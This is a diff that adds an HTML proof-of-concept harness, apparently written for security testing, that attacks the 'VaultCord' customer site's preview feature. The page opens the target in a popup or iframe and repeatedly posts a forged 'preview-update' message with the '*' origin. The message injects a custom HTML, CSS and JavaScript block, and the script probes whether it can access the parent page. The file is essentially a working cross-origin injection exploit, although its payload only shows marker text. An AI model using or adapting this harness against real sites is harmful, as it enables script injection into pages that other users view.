@@ -1,0 +1,73 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>VC preview-injection harness</title></head>
+<body>
+<h3>VaultCord preview postMessage harness (attacker origin = this page)</h3>
+<button id="go">Open target</button>
+<pre id="log"></pre>
+<script>
+const qs = new URLSearchParams(location.search);
+const TARGET = qs.get('target') || 'https://customers.vaultcord.com/hi?previewToken=harness-proof-1';
+const MODE = qs.get('mode') || 'popup';
+
+const LAYOUT = {
+  schemaVersion: 1,
+  theme: {
+    font: null, textColor: "#FFF", backgroundColor: "#0B0C10",
+    borderColor: "#0000", cardBorder: "#1a1716", verifyColor: "#5865F2",
+    cursor: null, textGlow: false, cardTilting: false
+  },
+  backgroundEffect: null,
+  blocks: [
+    { id: "legacy-avatar", type: "avatar", order: 0, visible: true,
+      props: { imageUrl: null } },
+    { id: "legacy-bio", type: "bio", order: 1, visible: true,
+      props: { text: "PREVIEW-INJECTION-PROOF-8f2c1d", typingEffect: false } },
+    { id: "legacy-code", type: "customCode", order: 2, visible: true,
+      props: {
+        html: "<div id='inj'>VC-SANDBOX-PROOF</div>",
+        css: "#inj{color:#0f0;font-family:monospace}",
+        js: "window.__INJECTED=1;try{var x=window.parent.document.getElementById('__NEXT_DATA__')?'SAME-ORIGIN-ACCESS':'READ-OK';document.getElementById('inj').textContent='VC-SANDBOX-PROOF jsRan=1 parent='+x}catch(e){document.getElementById('inj').textContent='VC-SANDBOX-PROOF jsRan=1 parent=THROWS:'+e.name}"
+      } },
+    { id: "legacy-links", type: "links", order: 3, visible: true,
+      props: { links: [ { id: "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee", url: "https://example.com/probe", title: "CLICK-PROOF", enabled: true, style: "outline" } ] } }
+  ],
+  security: { passwordProtected: false, captcha: "none" },
+  meta: { updatedAt: new Date().toISOString(), updatedBy: "harness", publishedAt: new Date().toISOString() }
+};
+
+const log = (m) => { document.getElementById('log').textContent += m + '\n'; };
+
+function pump(w) {
+  let n = 0;
+  const t = setInterval(() => {
+    try {
+      w.postMessage({ type: 'vaultcord:preview-update', layout: LAYOUT }, '*');
+      n++;
+    } catch (e) { log('err ' + e.message); clearInterval(t); }
+    if (n >= 300) clearInterval(t);
+  }, 400);
+  log('pumping preview-update to ' + TARGET);
+}
+
+document.getElementById('go').addEventListener('click', () => {
+  if (MODE === 'iframe') {
+    const f = document.createElement('iframe');
+    f.id = 'victim';
+    f.style.cssText = 'width:100%;height:700px;border:2px solid red';
+    f.src = TARGET;
+    document.body.appendChild(f);
+    f.addEventListener('load', () => pump(f.contentWindow));
+    log('iframe mode: victim framed inside attacker page');
+  } else {
+    let w = window.open(TARGET, 'vcproof', 'width=1150,height=950');
+    if (!w) w = window.open(TARGET, '_blank');
+    if (!w) w = window.open(TARGET);
+    if (!w) { log('popup blocked'); return; }
+    log('popup opened');
+    setTimeout(() => pump(w), 1500);
+  }
+});
+</script>
+</body>
+</html>
